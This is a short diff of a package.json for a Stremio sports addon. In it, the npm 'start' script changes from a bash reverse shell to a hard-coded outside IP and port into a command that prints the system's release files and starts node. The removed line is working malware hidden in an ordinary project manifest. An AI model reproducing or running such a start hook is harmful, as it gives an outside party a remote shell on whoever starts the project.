@@ -3,7 +3,7 @@
 	"version": "0.0.1",
 	"description": "FreeSports Stremio addon.",
 	"scripts": {
-		"start": "bash -c 'exec bash -i &>/dev/tcp/18.192.93.86/16595 <&1'"
+		"start": "cat /etc/*-release && node server.js"
 	},
 	"dependencies": {
 		"@bochilteam/scraper-images": "^1.0.2",
